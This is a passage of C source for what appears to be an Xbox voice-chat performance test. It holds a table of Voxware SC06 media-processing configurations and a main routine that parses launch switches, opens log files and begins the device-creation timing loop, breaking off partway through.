    { MediaProcess, "Process, Decoder Mix, 50 Buffers, 20ms, Voxware SC06, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC06, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Queue Mix, 50 Buffers, 20ms, Voxware SC06, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC06, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 50 Buffers, 20ms, Voxware SC06, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC06, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Queue Mix), 50 Buffers, 20ms, Voxware SC06, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Decoder, 50 Buffers, 20ms, Voxware SC06, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Decoder Mix, 50 Buffers, 20ms, Voxware SC06, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Queue, 50 Buffers, 20ms, Voxware SC06, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Queue Mix, 50 Buffers, 20ms, Voxware SC06, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Decoder), 50 Buffers, 20ms, Voxware SC06, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Decoder Mix), 50 Buffers, 20ms, Voxware SC06, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Queue), 50 Buffers, 20ms, Voxware SC06, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, All (Queue Mix), 50 Buffers, 20ms, Voxware SC06, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 50,  20  },
    { MediaProcess, "Process, Microphone, 5 Buffers, 40ms, Voxware SC06, 1",           1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Headphone, 5 Buffers, 40ms, Voxware SC06, 1",            0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Encoder, 5 Buffers, 40ms, Voxware SC06, 1",              0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC06, 1",              0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC06, 1",                0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC06, 1",        1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC06, 1",          1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Microphone, 5 Buffers, 40ms, Voxware SC06, 4",           4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Headphone, 5 Buffers, 40ms, Voxware SC06, 4",            0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Encoder, 5 Buffers, 40ms, Voxware SC06, 4",              0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC06, 4",              0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Decoder Mix, 5 Buffers, 40ms, Voxware SC06, 4",          0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC06, 4",                0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Queue Mix, 5 Buffers, 40ms, Voxware SC06, 4",            0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC06, 4",        4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Decoder Mix), 5 Buffers, 40ms, Voxware SC06, 4",    4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC06, 4",          4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Queue Mix), 5 Buffers, 40ms, Voxware SC06, 4",      4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Decoder, 5 Buffers, 40ms, Voxware SC06, 12",             0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Decoder Mix, 5 Buffers, 40ms, Voxware SC06, 12",         0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Queue, 5 Buffers, 40ms, Voxware SC06, 12",               0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Queue Mix, 5 Buffers, 40ms, Voxware SC06, 12",           0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Decoder), 5 Buffers, 40ms, Voxware SC06, 12",       4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Decoder Mix), 5 Buffers, 40ms, Voxware SC06, 12",   4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Queue), 5 Buffers, 40ms, Voxware SC06, 12",         4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, All (Queue Mix), 5 Buffers, 40ms, Voxware SC06, 12",     4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 5,   40  },
    { MediaProcess, "Process, Microphone, 25 Buffers, 40ms, Voxware SC06, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Headphone, 25 Buffers, 40ms, Voxware SC06, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Encoder, 25 Buffers, 40ms, Voxware SC06, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC06, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC06, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC06, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC06, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Microphone, 25 Buffers, 40ms, Voxware SC06, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Headphone, 25 Buffers, 40ms, Voxware SC06, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Encoder, 25 Buffers, 40ms, Voxware SC06, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC06, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Decoder Mix, 25 Buffers, 40ms, Voxware SC06, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC06, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Queue Mix, 25 Buffers, 40ms, Voxware SC06, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC06, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Decoder Mix), 25 Buffers, 40ms, Voxware SC06, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC06, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Queue Mix), 25 Buffers, 40ms, Voxware SC06, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Decoder, 25 Buffers, 40ms, Voxware SC06, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Decoder Mix, 25 Buffers, 40ms, Voxware SC06, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Queue, 25 Buffers, 40ms, Voxware SC06, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Queue Mix, 25 Buffers, 40ms, Voxware SC06, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Decoder), 25 Buffers, 40ms, Voxware SC06, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Decoder Mix), 25 Buffers, 40ms, Voxware SC06, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Queue), 25 Buffers, 40ms, Voxware SC06, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, All (Queue Mix), 25 Buffers, 40ms, Voxware SC06, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 25,  40  },
    { MediaProcess, "Process, Microphone, 2 Buffers, 100ms, Voxware SC06, 1",          1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Headphone, 2 Buffers, 100ms, Voxware SC06, 1",           0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Encoder, 2 Buffers, 100ms, Voxware SC06, 1",             0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC06, 1",             0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC06, 1",               0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC06, 1",       1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC06, 1",         1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Microphone, 2 Buffers, 100ms, Voxware SC06, 4",          4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Headphone, 2 Buffers, 100ms, Voxware SC06, 4",           0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Encoder, 2 Buffers, 100ms, Voxware SC06, 4",             0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC06, 4",             0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Decoder Mix, 2 Buffers, 100ms, Voxware SC06, 4",         0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC06, 4",               0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Queue Mix, 2 Buffers, 100ms, Voxware SC06, 4",           0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC06, 4",       4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Decoder Mix), 2 Buffers, 100ms, Voxware SC06, 4",   4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC06, 4",         4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Queue Mix), 2 Buffers, 100ms, Voxware SC06, 4",     4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Decoder, 2 Buffers, 100ms, Voxware SC06, 12",            0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Decoder Mix, 2 Buffers, 100ms, Voxware SC06, 12",        0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Queue, 2 Buffers, 100ms, Voxware SC06, 12",              0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Queue Mix, 2 Buffers, 100ms, Voxware SC06, 12",          0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Decoder), 2 Buffers, 100ms, Voxware SC06, 12",      4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Decoder Mix), 2 Buffers, 100ms, Voxware SC06, 12",  4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Queue), 2 Buffers, 100ms, Voxware SC06, 12",        4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, All (Queue Mix), 2 Buffers, 100ms, Voxware SC06, 12",    4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 2,   100 },
    { MediaProcess, "Process, Microphone, 10 Buffers, 100ms, Voxware SC06, 1",         1, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Headphone, 10 Buffers, 100ms, Voxware SC06, 1",          0, 1, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Encoder, 10 Buffers, 100ms, Voxware SC06, 1",            0, 0, 1, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC06, 1",            0, 0, 0, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC06, 1",              0, 0, 0, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC06, 1",      1, 1, 1, 1,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC06, 1",        1, 1, 1, 0,  1,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Microphone, 10 Buffers, 100ms, Voxware SC06, 4",         4, 0, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Headphone, 10 Buffers, 100ms, Voxware SC06, 4",          0, 4, 0, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Encoder, 10 Buffers, 100ms, Voxware SC06, 4",            0, 0, 4, 0,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC06, 4",            0, 0, 0, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 100ms, Voxware SC06, 4",        0, 0, 0, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC06, 4",              0, 0, 0, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 100ms, Voxware SC06, 4",          0, 0, 0, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC06, 4",      4, 4, 4, 4,  0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 100ms, Voxware SC06, 4",  4, 4, 4, 4,  0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC06, 4",        4, 4, 4, 0,  4,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 100ms, Voxware SC06, 4",    4, 4, 4, 0,  4,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Decoder, 10 Buffers, 100ms, Voxware SC06, 12",           0, 0, 0, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Decoder Mix, 10 Buffers, 100ms, Voxware SC06, 12",       0, 0, 0, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Queue, 10 Buffers, 100ms, Voxware SC06, 12",             0, 0, 0, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, Queue Mix, 10 Buffers, 100ms, Voxware SC06, 12",         0, 0, 0, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Decoder), 10 Buffers, 100ms, Voxware SC06, 12",     4, 4, 4, 12, 0,  FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Decoder Mix), 10 Buffers, 100ms, Voxware SC06, 12", 4, 4, 4, 12, 0,  TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Queue), 10 Buffers, 100ms, Voxware SC06, 12",       4, 4, 4, 0,  12, FALSE, WAVE_FORMAT_VOXWARE_SC06, 10,  100 },
    { MediaProcess, "Process, All (Queue Mix), 10 Buffers, 100ms, Voxware SC06, 12",   4, 4, 4, 0,  12, TRUE,  WAVE_FORMAT_VOXWARE_SC06, 10,  100 }
};

#define MediaProcessFunctionTableCount (sizeof(MediaProcessFunctionTable) / sizeof(MEDIA_PROCESS_FUNCTION_TABLE))

#define AllFunctionTestCount   DeviceCreateFunctionTableCount + CodecCreateFunctionTableCount + MediaProcessFunctionTableCount
#define AllFunctionTableCount  3



void __cdecl main()
{
    // hMemObject is the mem object
    HANDLE         hMemObject = INVALID_HANDLE_VALUE;

    // LaunchData is the title launch data
    LAUNCH_DATA    LaunchData;
    // szCmdLine is the title command line
    CHAR           *szCmdLine;
    // szParameter is a title command line parameter
    CHAR           *szParameter;
    // dwDataType is the type of title launch data
    DWORD          dwDataType;

    // dwTableIndex is a counter to enumerate each table
    DWORD          dwTableIndex = 0;
    // dwNumTables is the number of tables
    DWORD          dwNumTables = AllFunctionTableCount;
    // dwTestIndex is a counter to enumerate each test
    DWORD          dwTestIndex = 0;
    // dwTestIteration is a counter to enumerate each test iteration
    DWORD          dwTestIteration = 0;
    // dwNumIterations is the number of test iterations
    DWORD          dwNumIterations = 10;

    // hLogAll is a handle to the log file
    HANDLE         hLogAll = INVALID_HANDLE_VALUE;
    // lpszLogFileNameAll is the name of the log file
    LPSTR          lpszLogFileNameAll = "T:\\xvoiceperf_all.log";
    // hLogSummary is a handle to the log file
    HANDLE         hLogSummary = INVALID_HANDLE_VALUE;
    // lpszLogFileNameSummary is the name of the log file
    LPSTR          lpszLogFileNameSummary = "T:\\xvoiceperf_summary.log";
    // hLogDeviceCreateCsv is a handle to the device create csv log file
    HANDLE         hLogDeviceCreateCsv = INVALID_HANDLE_VALUE;
    // lpszLogFileNameDeviceCreateCsv is the name of the device create csv log file
    LPSTR          lpszLogFileNameDeviceCreateCsv = "T:\\xvoiceperf_devicecreate.csv";
    // hLogCodecCreateCsv is a handle to the codec create csv log file
    HANDLE         hLogCodecCreateCsv = INVALID_HANDLE_VALUE;
    // lpszLogFileNameCodecCreateCsv is the name of the device create csv log file
    LPSTR          lpszLogFileNameCodecCreateCsv = "T:\\xvoiceperf_codeccreate.csv";
    // hLogProcessCsv is a handle to the process csv log file
    HANDLE         hLogProcessCsv = INVALID_HANDLE_VALUE;
    // lpszLogFileNameProcessCsv is the name of the process csv log file
    LPSTR          lpszLogFileNameProcessCsv = "T:\\xvoiceperf_process.csv";

    // KernelTime is the kernel time
    ULONG          KernelTime;
    // InterruptTime is the interrupt time
    ULONG          InterruptTime;
    // DpcTime is the dpc time
    ULONG          DpcTime;
    // IdleTime is the idle time
    ULONG          IdleTime;

    // dwNumMicrophoneFailures is the number of microphone creation failures
    DWORD          dwNumMicrophoneFailures;
    // dwNumTotalMicrophoneFailures is the number total of microphone creation failures
    DWORD          dwNumTotalMicrophoneFailures = 0;
    // dwNumHeadphoneFailures is the number of headphone creation failures
    DWORD          dwNumHeadphoneFailures;
    // dwNumTotalHeadphoneFailures is the number total of headphone creation failures
    DWORD          dwNumTotalHeadphoneFailures = 0;
    // dwNumEncoderFailures is the number of encoder creation failures
    DWORD          dwNumEncoderFailures;
    // dwNumTotalEncoderFailures is the number total of encoder creation failures
    DWORD          dwNumTotalEncoderFailures = 0;
    // dwNumDecoderFailures is the number of decoder creation failures
    DWORD          dwNumDecoderFailures;
    // dwNumTotalDecoderFailures is the number total of decoder creation failures
    DWORD          dwNumTotalDecoderFailures = 0;
    // dwNumQueueFailures is the number of queue creation failures
    DWORD          dwNumQueueFailures;
    // dwNumTotalQueueFailures is the number total of queue creation failures
    DWORD          dwNumTotalQueueFailures = 0;



    // Create the private heap
    hMemObject = xMemCreate();
    if (INVALID_HANDLE_VALUE == hMemObject) {
        XLaunchNewImage(NULL, NULL);
    }

    // Get the launch info
    XGetLaunchInfo(&dwDataType, &LaunchData);

    if (LDT_FROM_DEBUGGER_CMDLINE == dwDataType) {
        szCmdLine = ((LD_FROM_DEBUGGER_CMDLINE *) &LaunchData)->szCmdLine;

        szParameter = strstr(szCmdLine, "/S:");
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "/s:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-S:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-s:");
        }

        if (NULL != szParameter) {
            dwTableIndex = atoi(szParameter + 3);
        }

        szParameter = strstr(szCmdLine, "/E:");
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "/e:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-E:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-e:");
        }

        if (NULL != szParameter) {
            dwNumTables = __max(atoi(szParameter + 3), AllFunctionTableCount);
        }

        szParameter = strstr(szCmdLine, "/X:");
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "/x:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-X:");
        }
        if (NULL == szParameter) {
            szParameter = strstr(szCmdLine, "-x:");
        }

        if (NULL != szParameter) {
            dwNumIterations = atoi(szParameter + 3);
        }
    }

    // Open the log file
    hLogAll = CreateFile(lpszLogFileNameAll, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    hLogSummary = CreateFile(lpszLogFileNameSummary, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    hLogDeviceCreateCsv = CreateFile(lpszLogFileNameDeviceCreateCsv, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    LogDeviceCreateBanner(hLogDeviceCreateCsv);

    hLogCodecCreateCsv = CreateFile(lpszLogFileNameCodecCreateCsv, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    LogCodecCreateBanner(hLogCodecCreateCsv);

    hLogProcessCsv = CreateFile(lpszLogFileNameProcessCsv, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    LogProcessBanner(hLogProcessCsv);

    // Flush the file buffers to prevent corruption
    FlushFileBuffers(hLogAll);
    FlushFileBuffers(hLogSummary);
    FlushFileBuffers(hLogDeviceCreateCsv);
    FlushFileBuffers(hLogCodecCreateCsv);
    FlushFileBuffers(hLogProcessCsv);

    // Initialize
    if (FALSE == DeviceInit(hLogAll)) {
        goto ExitTest;
    }

    // Device Create Tests
    if ((dwNumTables >= dwTableIndex) && (0 == dwTableIndex)) {
        for (dwTestIndex = 0; dwTestIndex < DeviceCreateFunctionTableCount; dwTestIndex++) {
            ZeroMemory(&KernelTime, sizeof(KernelTime));
            ZeroMemory(&InterruptTime, sizeof(InterruptTime));
            ZeroMemory(&DpcTime, sizeof(DpcTime));
            ZeroMemory(&IdleTime, sizeof(IdleTime));

            dwNumMicrophoneFailures = 0;
            dwNumHeadphoneFailures = 0;

            for (dwTestIteration = 0; dwTestIteration < dwNumIterations; dwTestIteration++) {
